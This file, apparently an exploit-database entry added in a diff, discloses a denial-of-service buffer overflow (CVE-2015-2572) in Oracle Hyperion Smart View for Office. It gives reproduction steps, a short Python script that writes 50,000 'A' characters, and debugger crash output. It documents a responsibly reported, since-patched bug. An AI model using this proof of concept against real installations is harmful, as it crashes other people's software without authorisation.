@@ -1,0 +1,93 @@
+# Exploit Title: Buffer Overflow in Oracle� Hyperion Smart View for Office
+[DOS]
+# Exploit Author: sajith
+# Vendor Homepage: http://oracle.com
+# vulnerable Version: Fusion Edition 11.1.2.3.000 Build 157
+#Vulnerable Link:
+http://www.oracle.com/technetwork/middleware/smart-view-for-office/downloads/index.html
+# Tested in: Microsoft Windows 7 Enterprise 6.1.7601 Service Pack 1
+[x64],en-us
+#plugin tested with Microsoft Excel 2010
+#CVE: CVE-2015-2572
+
+Responsible Disclosure:
+
+Reported to Oracle on Jul 7, 2014
+patch released on April 14, 2015
+
+How to reproduce the bug?
+
+
+1)install "Smart view" and open Microsoft excel and click on "smart view"
+tab
+
+2)click on "Options" and then click on "Advanced" tab
+
+3) In General menu in "shared Connections URL" enter large value say 50000
+"A"'s and press ok, the application crashes, the output of the crash
+analyzed in debugger is shown below
+
+Note:Plugin once installed automatically integrates with Microsoft office
+products like,excel,Word,PowerPoint,Microsoft office.so the vulnerability
+can be exploited via any of these products.
+
+==================python script to create 50000 "A"'s============
+
+
+try:
+
+    print "POC by sajith shetty"
+
+    f = open("text.txt","w")
+
+    junk = "A" * 50000
+
+    f.write(junk)
+
+    print "done"
+
+except Exception, e:
+
+        print "error- " + str(e)
+
+
+Debugger o/p:
+
+eax=00410061 ebx=0041005d ecx=00410041 edx=00000000 esi=00410061
+edi=0041005d
+eip=779622d2 esp=0040b7f8 ebp=0040b80c iopl=0         nv up ei pl nz na pe
+nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00010206
+ntdll!RtlEnterCriticalSection+0x12:
+779622d2 f00fba3000      lock btr dword ptr [eax],0
+ds:002b:00410061=????????
+
+caused by MODULE_NAME: HsAddin
+
+
+start    end        module name
+0fb50000 111a0000   HsAddin    (export symbols)
+C:\Oracle\SmartView\bin\HsAddin.dll
+    Loaded symbol image file: C:\Oracle\SmartView\bin\HsAddin.dll
+    Image path: C:\Oracle\SmartView\bin\HsAddin.dll
+    Image name: HsAddin.dll
+    Timestamp:        Wed Mar 27 04:27:50 2013 (515227EE)
+    CheckSum:         0163F951
+    ImageSize:        01650000
+    File version:     11.1.2.3085
+    Product version:  11.1.2.3085
+    File flags:       0 (Mask 3F)
+    File OS:          4 Unknown Win32
+    File type:        2.0 Dll
+    File date:        00000000.00000000
+    Translations:     0409.04b0
+    CompanyName:      Oracle Corporation
+    ProductName:      Oracle� Hyperion Smart View for Office, Fusion Edition
+    InternalName:     CommonAddin
+    ProductVersion:   11.1.2.3.000.157
+    FileVersion:      11.1.2.3085
+    FileDescription:  Oracle� Hyperion Smart View for Office, Fusion Edition
+    LegalCopyright:   Copyright 2004, 2013 Oracle Corporation.  All rights
+reserved
+    LegalTrademarks:  Oracle� is registered.
